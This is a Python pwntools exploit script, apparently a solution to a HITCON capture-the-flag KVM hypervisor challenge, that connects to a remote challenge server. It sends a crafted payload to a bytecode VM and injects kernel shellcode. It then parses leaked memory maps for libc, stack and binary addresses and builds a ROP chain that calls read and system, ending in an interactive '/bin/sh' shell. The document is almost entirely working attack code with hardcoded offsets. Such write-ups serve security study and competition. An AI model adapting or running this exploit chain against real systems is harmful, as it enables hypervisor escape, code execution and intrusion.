#!/usr/bin/env python
# coding: utf-8

from pwn import *

# hitcon{first-grade-artifact:KVM-exploitor}

context.terminal = ['mate-terminal', '--maximize', '-x', 'sh', '-c']
context.log_level = 'debug'

local = False

if local:
	p = process(['./hypervisor.elf', 'kernel.bin', 'ld.so.2', './user.elf'])
else:
	p = remote('35.200.23.198', 31733)
	pass

def byte2int(payload):
	ret = []
	for i in range(0, len(payload), 4):
		ret.append(u32(payload[i:i+4].ljust(4, '\0')))
	return ret

# 0x25: pop
# 0x2B: add
# 0x2E: writed
# 0x3A: store
# 0x3B: fetch
# 0x5C: swap

sc = open('stage2.asm').read()
# print(sc)
sc = asm(sc, arch='amd64')

sc_addr = 0x2020A8
payload = str(0) + '\x7D'
arr = byte2int(sc)
payload += '\x7D'.join(str(x & 0xFFFFFFFF) for x in arr)
payload += (len(arr) + 1) * '\x25'
payload += str(-27 & 0xFFFFFFFF) + '\x5C' + str(0) + '\x3A' + str(1) + '\x3A'
payload += (str(0x41414141) + '\x7D') * 4
payload += str(1) + '\x3B' + str(sc_addr - 0x7B6) + '\x2B' + str(0) + '\x3B' + '\x2E'

p.recvuntil('down.\n')
p.sendline(payload)

p.recvuntil('19260817')

kernel_sc = open('read_file.asm').read()
kernel_sc = asm(kernel_sc, arch='amd64')
assert len(kernel_sc) < 0xADB - 3
kernel_sc = kernel_sc.ljust(0xADB - 3, '\x90')
kernel_sc += '\x6a\x00\xc3'
kernel_sc += '\xeb\x80' * 100
kernel_sc = kernel_sc.ljust(0xD00, '\x90')
p.send(kernel_sc)

map_data = p.recvuntil('[vsyscall]')
for line in map_data.split('\n'):
	if '/lib/x86_64-linux-gnu/libc' in line and 'r-xp' in line:
		region = line.split(' ')[0]
		libc = int(region.split('-')[0], 16)
	elif '[stack]' in line:
		region = line.split(' ')[0]
		stack_bottom = int(region.split('-')[0], 16)
		stack_top = int(region.split('-')[1], 16)
	elif 'hypervisor.elf' in line and 'r--p' in line:
		region = line.split(' ')[0]
		elf = int(region.split('-')[0], 16) - 0x203000

print(map_data)
print('[+] stack : %#x - %#x' % (stack_bottom, stack_top))
print('[+] libc : %#x' % libc)
print('[+] elf : %#x' % elf)
ret_addr = elf + 0x1743
rdi_ret = elf + 0x2a03
test_ret = elf + 0x1C15

if local:
	system = libc + 0x45390
	binsh = libc + 0x18c177
	puts = libc + 0x6f690
	mprotect = libc + 0x100b80
	read = libc + 0xf6670
	rdx_ret = libc + 0x1b92
	rsi_ret = libc + 0x202e8
else:
	system = libc + 0x4f440
	binsh = libc + 0x1b3e9a
	puts = libc + 0x809C0
	rdx_ret = libc + 0x1b96
	rsi_ret = libc + 0x23e6a
	read = libc + 0x110070
	mprotect = libc + 0x11bae0

if local:
	gdb.attach(p, gdbscript=open('pie-hyper.x'))

rop_chain = [rdi_ret, 0, rsi_ret, stack_bottom, rdx_ret, 0x100, read, rdi_ret, stack_bottom, system]
chain_code = ''
for r in rop_chain:
	chain_code += 'mov rax, {:#x}\n'.format(r)
	chain_code += 'mov [r12], rax\n'
	chain_code += 'add r12, 8\n'

kernel_sc = open('stage3.asm').read().format(stack_bottom, ret_addr,chain_code=chain_code)
kernel_sc = asm(kernel_sc, arch='amd64')
kernel_sc = kernel_sc.ljust(0x800, '\x90')
p.send(kernel_sc)
p.recvuntil('19260817')

# Input system argument
p.sendline('/bin/sh\0')

p.interactive()
